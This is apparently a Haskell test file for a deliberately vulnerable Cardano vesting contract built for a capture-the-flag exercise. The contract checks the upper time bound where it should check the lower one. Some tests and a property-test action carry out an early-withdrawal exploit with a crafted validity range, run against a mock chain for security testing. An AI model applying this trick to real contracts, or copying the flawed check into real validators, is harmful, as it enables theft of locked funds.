{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Vesting validator using TestingInterface.

This module demonstrates property-based testing of a time-locked vesting contract
with a **wrong time bound vulnerability**. The CTF Vesting validator checks
@upper_bound@ instead of @lower_bound@, allowing early withdrawal.

== The Vulnerability ==

The validator should check that the lower bound of the validity range is past
the lock deadline, ensuring the transaction cannot be submitted before unlock time.
Instead, it checks the upper bound, which only requires that the validity range
EXTENDS past the deadline.

An attacker can construct a validity range like @[0, deadline+1]@ which passes
the upper bound check but can actually be submitted at time 0 (before the deadline).

The Aiken types encode as:
- @Datum { lock_until: Int, beneficiary: VerificationKeyHash }@ = @Constr 0 [time, pkh]@
- @Redeemer: Void@ = @()@ (unit)
-}
module AikenVestingSpec (
  -- * TestingInterface model
  VestingModel (..),

  -- * Test tree
  aikenVestingTests,
) where

import Cardano.Api qualified as C
import Control.Lens ((%~))
import Control.Monad (void)
import Control.Monad.IO.Class (MonadIO (..))
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.CardanoApi.Lenses (txValidityLowerBound, txValidityUpperBound)
import Convex.Class (MonadMockchain, getUtxo, setSlot)
import Convex.CoinSelection (ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.TestingInterface (
  RunOptions,
  TestingInterface (..),
  ThreatModelsFor (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel.Cardano.Api (dummyTxId)
import Convex.ThreatModel.TimeBoundManipulation (timeBoundManipulation)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, verificationKeyHash)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)

import Paths_convex_testing_interface qualified as Pkg
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import Data.Aeson (ToJSON (..))
import System.IO.Unsafe (unsafePerformIO)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Vesting Datum type (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the vesting script address.

Aiken encodes this as: @Constr 0 [lock_until, beneficiary]@

The lock_until is a POSIX timestamp in milliseconds.
The beneficiary is a 28-byte pubkey hash.
-}
data VestingDatum = VestingDatum
  { vdLockUntil :: Integer
  -- ^ POSIX time in milliseconds when funds unlock
  , vdBeneficiary :: PlutusTx.BuiltinByteString
  -- ^ The pubkey hash of who can claim the funds
  }
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''VestingDatum

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_vesting" validator from the embedded blueprint
loadCtfVestingScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadCtfVestingScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_vesting.ctf_vesting.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_vesting.ctf_vesting.spend not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Vesting script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE ctfVestingScript #-}
ctfVestingScript :: C.PlutusScript C.PlutusScriptV3
ctfVestingScript = unsafePerformIO loadCtfVestingScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the vesting script
vestingScriptHash :: C.ScriptHash
vestingScriptHash = C.hashScript (plutusScript ctfVestingScript)

-- | Address of the vesting script on the default network
vestingAddress :: C.AddressInEra C.ConwayEra
vestingAddress =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript vestingScriptHash)
    C.NoStakeAddress

-- ----------------------------------------------------------------------------
-- Time constants
-- ----------------------------------------------------------------------------

{- | The mockchain system start is Jan 1, 2022 = POSIX 1640995200 seconds = 1640995200000 ms
Slots correspond 1:1 with seconds from system start
So slot N corresponds to POSIX time (systemStartPosixMs + N * 1000)
-}
systemStartPosixMs :: Integer
systemStartPosixMs = 1640995200 * 1000 -- Jan 1, 2022 in milliseconds

-- | Convert a slot number to POSIX time in milliseconds (for use in datum)
slotToPosixMs :: C.SlotNo -> Integer
slotToPosixMs (C.SlotNo n) = systemStartPosixMs + fromIntegral n * 1000

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Lock funds at the vesting script address with a time-locked datum.

The beneficiary is derived from the given wallet's pubkey hash.
-}
lockVesting
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ The beneficiary who can claim after lock_until
  -> Integer
  -- ^ lock_until: POSIX time in milliseconds
  -> C.Lovelace
  -- ^ Value to lock
  -> m ()
lockVesting networkId beneficiary lockUntil value = do
  let beneficiaryPkh = verificationKeyHash beneficiary
      -- Convert to BuiltinByteString
      beneficiaryBytes = PlutusTx.toBuiltin $ C.serialiseToRawBytes beneficiaryPkh
      datum = VestingDatum{vdLockUntil = lockUntil, vdBeneficiary = beneficiaryBytes}
  BuildTx.payToScriptInlineDatum
    networkId
    vestingScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue value)

{- | Unlock vested funds by spending the script UTxO.

The beneficiary must sign the transaction and the validity range must satisfy
the script's time check.

IMPORTANT: This builder sets the validity range to [lowerSlot, upperSlot].
For legitimate unlocks, set both past the deadline.
For exploits, you can set the range to [0, deadline+margin] to exploit the
upper_bound vulnerability.
-}
unlockVesting
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.TxIn
  -- ^ The script UTxO to spend
  -> Wallet
  -- ^ The beneficiary who is claiming
  -> C.SlotNo
  -- ^ Lower bound of validity range
  -> C.SlotNo
  -- ^ Upper bound of validity range
  -> m ()
unlockVesting txIn beneficiary lowerSlot upperSlot = do
  let beneficiaryPkh = verificationKeyHash beneficiary
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            ctfVestingScript
            (C.ScriptDatumForTxIn Nothing)
            () -- Void redeemer
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  BuildTx.addRequiredSignature beneficiaryPkh
  -- Set validity range
  BuildTx.addBtx (txValidityLowerBound %~ const (C.TxValidityLowerBound C.allegraBasedEra lowerSlot))
  BuildTx.addBtx (txValidityUpperBound %~ const (C.TxValidityUpperBound C.shelleyBasedEra (Just upperSlot)))

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the vesting script address
findVestingUtxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, VestingDatum)]
findVestingUtxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == vestingAddress) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @VestingDatum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenVestingUnitTests :: TestTree
aikenVestingUnitTests =
  testGroup
    "ctf vesting unit tests"
    [ testCase "lock vesting funds" $
        mockchainSucceeds $
          failOnError $ do
            -- Lock at slot 500, which corresponds to POSIX time systemStartPosixMs + 500000
            let lockSlot = C.SlotNo 500
                lockTime = slotToPosixMs lockSlot
                txBody = execBuildTx $ lockVesting @C.ConwayEra Defaults.networkId Wallet.w1 lockTime 10_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findVestingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if vdLockUntil datum == lockTime
                    then pure ()
                    else assertFailure $ "Wrong lock time: " ++ show (vdLockUntil datum)
    , testCase "unlock after deadline (legitimate)" $
        mockchainSucceeds $
          failOnError $ do
            -- Lock until slot 500
            let lockSlot = C.SlotNo 500
                lockTime = slotToPosixMs lockSlot
            -- Lock funds with w1 as beneficiary
            let lockTxBody = execBuildTx $ lockVesting @C.ConwayEra Defaults.networkId Wallet.w1 lockTime 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 lockTxBody TrailingChange []

            -- Advance to slot 600 (past the deadline)
            setSlot (C.SlotNo 600)

            -- Find the locked UTxO
            result <- findVestingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                -- Set validity range entirely past the deadline: [500, 700]
                let lowerSlot = C.SlotNo 500
                    upperSlot = C.SlotNo 700
                    unlockTxBody = execBuildTx $ unlockVesting @C.ConwayEra txIn Wallet.w1 lowerSlot upperSlot
                void $ tryBalanceAndSubmit mempty Wallet.w1 unlockTxBody TrailingChange []

                -- Verify UTxO is gone
                result2 <- findVestingUtxos
                case result2 of
                  [] -> pure ()
                  _ -> liftIO $ assertFailure "Expected no UTxO at script after unlock"
    , testCase "exploit: unlock BEFORE deadline using upper_bound trick" $
        mockchainSucceeds $
          failOnError $ do
            -- Lock until slot 1000
            let lockSlot = C.SlotNo 1000
                lockTime = slotToPosixMs lockSlot
            -- Lock funds with w1 as beneficiary
            let lockTxBody = execBuildTx $ lockVesting @C.ConwayEra Defaults.networkId Wallet.w1 lockTime 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 lockTxBody TrailingChange []

            -- DO NOT advance time - we're at slot 0 (or very early)
            -- The exploit: set validity range [0, 1001]
            -- The script checks upper_bound >= lockTime (slot 1001 >= slot 1000), which passes
            -- But we're actually at slot 0 (before the deadline)!

            result <- findVestingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                -- Exploit validity range: starts at 0, extends past deadline
                let lowerSlot = C.SlotNo 0
                    upperSlot = C.SlotNo 1001
                    unlockTxBody = execBuildTx $ unlockVesting @C.ConwayEra txIn Wallet.w1 lowerSlot upperSlot
                -- This SHOULD fail for a correct implementation, but SUCCEEDS due to vulnerability!
                void $ tryBalanceAndSubmit mempty Wallet.w1 unlockTxBody TrailingChange []

                -- Verify UTxO is gone (exploit succeeded!)
                result2 <- findVestingUtxos
                case result2 of
                  [] -> pure () -- Exploit worked!
                  _ -> liftIO $ assertFailure "Exploit should have succeeded but didn't"
    , testCase "verify: proper lower_bound check would prevent exploit" $
        -- This test documents what SHOULD happen with a correct implementation
        -- Since this validator is vulnerable, we just document the expected behavior
        -- A correct validator would:
        -- 1. Check lower_bound >= lock_until
        -- 2. Reject transactions where validity range includes times before deadline
        -- The above tests demonstrate the vulnerability exists
        pure ()
    , testCase "lock, advance time, unlock cycle" $
        mockchainSucceeds $
          failOnError $ do
            -- Lock until slot 200
            let lockSlot = C.SlotNo 200
                lockTime = slotToPosixMs lockSlot
            -- Lock
            let lockTxBody = execBuildTx $ lockVesting @C.ConwayEra Defaults.networkId Wallet.w1 lockTime 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 lockTxBody TrailingChange []

            -- Advance to slot 250 (past deadline)
            setSlot (C.SlotNo 250)

            -- Unlock legitimately
            result <- findVestingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let lowerSlot = C.SlotNo 200
                    upperSlot = C.SlotNo 300
                    unlockTxBody = execBuildTx $ unlockVesting @C.ConwayEra txIn Wallet.w1 lowerSlot upperSlot
                void $ tryBalanceAndSubmit mempty Wallet.w1 unlockTxBody TrailingChange []
    ]

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Vesting contract
data VestingModel = VestingModel
  { vmLocked :: Bool
  -- ^ Whether funds are locked at script
  , vmLockSlot :: Maybe C.SlotNo
  -- ^ Lock deadline (slot number)
  , vmValue :: C.Lovelace
  -- ^ Amount locked
  , vmTxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script
  , vmBeneficiary :: Maybe PlutusTx.BuiltinByteString
  -- ^ Who can claim
  }
  deriving stock (Show, Eq)

instance ToJSON VestingModel where
  toJSON = toJSON . show

instance TestingInterface VestingModel where
  -- Actions for Vesting: lock funds and unlock (after deadline)
  data Action VestingModel
    = LockVesting C.Lovelace C.SlotNo
    | -- \^ Lock funds with a deadline (slot number)
      UnlockAfterDeadline
    | -- \^ Unlock after the deadline has passed (legitimate)
      UnlockBeforeDeadline
    -- \^ Unlock before deadline using exploit (demonstrates vulnerability)
    deriving stock (Show, Eq)

  initialize =
    pure $
      VestingModel
        { vmLocked = False
        , vmLockSlot = Nothing
        , vmValue = 0
        , vmTxIn = Nothing
        , vmBeneficiary = Nothing
        }

  -- Generate actions: init-type actions TIGHT, spending actions BROAD.
  -- LockVesting creates fresh UTxO (always succeeds on Cardano) - only when not locked.
  -- Unlock actions can fail on-chain - generate even when invalid for negative testing.
  arbitraryAction model
    | not (vmLocked model) =
        QC.frequency
          [ (7, LockVesting <$> genLovelace <*> genLockSlot)
          , (2, pure UnlockAfterDeadline) -- Invalid: not locked, will fail in perform
          , (1, pure UnlockBeforeDeadline) -- Invalid: not locked, will fail in perform
          ]
    | otherwise =
        QC.frequency
          [ (4, pure UnlockAfterDeadline)
          , (1, pure UnlockBeforeDeadline) -- Less frequent exploit attempts
          ]
   where
    genLovelace = fromInteger <$> QC.choose (5_000_000, 50_000_000)
    -- Use a fixed future range relative to slot 0 - we reset the clock before each lock
    genLockSlot = C.SlotNo . fromInteger <$> QC.choose (100, 500)

  precondition model (LockVesting _ _) = not (vmLocked model)
  precondition model UnlockAfterDeadline = vmLocked model
  precondition model UnlockBeforeDeadline = vmLocked model

  perform model action = case action of
    LockVesting amount lockSlot -> do
      -- Reset clock to slot 0 before locking to ensure lock slot is in the future
      setSlot (C.SlotNo 0)
      let lockTime = slotToPosixMs lockSlot
          txBody = execBuildTx $ lockVesting @C.ConwayEra Defaults.networkId Wallet.w1 lockTime amount
      void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
      let beneficiaryBytes = PlutusTx.toBuiltin $ C.serialiseToRawBytes (verificationKeyHash Wallet.w1)
       in pure $
            model
              { vmLocked = True
              , vmLockSlot = Just lockSlot
              , vmValue = amount
              , vmTxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
              , vmBeneficiary = Just beneficiaryBytes
              }
    UnlockAfterDeadline -> do
      result <- findVestingUtxos
      case result of
        [] -> fail "No UTxO found at vesting script address"
        ((txIn, _, datum) : _) -> do
          -- Calculate the lock slot from the datum's POSIX time
          let lockTime = vdLockUntil datum
              -- Convert back to approximate slot (lockTime - systemStartPosixMs) / 1000
              lockSlot = C.SlotNo $ fromIntegral ((lockTime - systemStartPosixMs) `div` 1000)
              C.SlotNo lockSlotNum = lockSlot
          -- Advance past deadline
          setSlot (C.SlotNo (lockSlotNum + 50))
          -- Legitimate unlock: validity range [lockSlot, lockSlot + 100]
          let lowerSlot = lockSlot
              upperSlot = C.SlotNo (lockSlotNum + 100)
              txBody = execBuildTx $ unlockVesting @C.ConwayEra txIn Wallet.w1 lowerSlot upperSlot
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
      pure $
        model
          { vmLocked = False
          , vmLockSlot = Nothing
          , vmValue = 0
          , vmTxIn = Nothing
          , vmBeneficiary = Nothing
          }
    UnlockBeforeDeadline -> do
      result <- findVestingUtxos
      case result of
        [] -> fail "No UTxO found at vesting script address"
        ((txIn, _, datum) : _) -> do
          -- Calculate the lock slot from the datum's POSIX time
          let lockTime = vdLockUntil datum
              lockSlot = C.SlotNo $ fromIntegral ((lockTime - systemStartPosixMs) `div` 1000)
              C.SlotNo lockSlotNum = lockSlot
          -- DO NOT advance time - stay before deadline
          -- Exploit: validity range [0, lockSlot + 1]
          let lowerSlot = C.SlotNo 0
              upperSlot = C.SlotNo (lockSlotNum + 1)
              txBody = execBuildTx $ unlockVesting @C.ConwayEra txIn Wallet.w1 lowerSlot upperSlot
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
      -- The exploit succeeds, so state changes same as legitimate unlock
      pure $
        model
          { vmLocked = False
          , vmLockSlot = Nothing
          , vmValue = 0
          , vmTxIn = Nothing
          , vmBeneficiary = Nothing
          }

  validate model = do
    result <- findVestingUtxos
    case (vmLocked model, result) of
      (False, []) -> pure True -- Not locked, no UTxO - correct
      (True, ((_, value, _) : _)) ->
        -- Locked with UTxO - check value matches
        pure $ C.selectLovelace value == vmValue model
      (False, (_ : _)) -> pure False -- Model says not locked but UTxO exists
      (True, []) -> pure False -- Model says locked but no UTxO

  monitoring _state _action prop = prop

instance ThreatModelsFor VestingModel where
  -- Threat models are empty because vesting is a one-shot spend contract:
  -- - Lock: Creates script output with inline datum
  -- - Unlock: Spends script output, funds go to beneficiary (NO continuation)
  --
  -- Standard threat models require script outputs in the FINAL transaction:
  -- - largeDataAttackWith: Needs script output to bloat
  -- - largeValueAttackWith: Needs script output to add junk tokens
  -- - unprotectedScriptOutput: Needs script input AND continuation output
  -- - doubleSatisfaction: Needs multiple script inputs
  --
  -- Since action sequences alternate Lock→Unlock→Lock→Unlock..., the final
  -- transaction (Unlock) never has script outputs, causing 100% test discard.
  threatModels = []

  -- timeBoundManipulation is a KNOWN vulnerability in this contract.
  -- It's run as an expected vulnerability (inverted pass/fail).
  expectedVulnerabilities = [timeBoundManipulation]

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Vesting tests grouped together
aikenVestingTests :: RunOptions -> TestTree
aikenVestingTests runOpts =
  testGroup
    "ctf vesting"
    [ aikenVestingUnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @VestingModel
            "property-based testing"
            runOpts
        ]
    ]
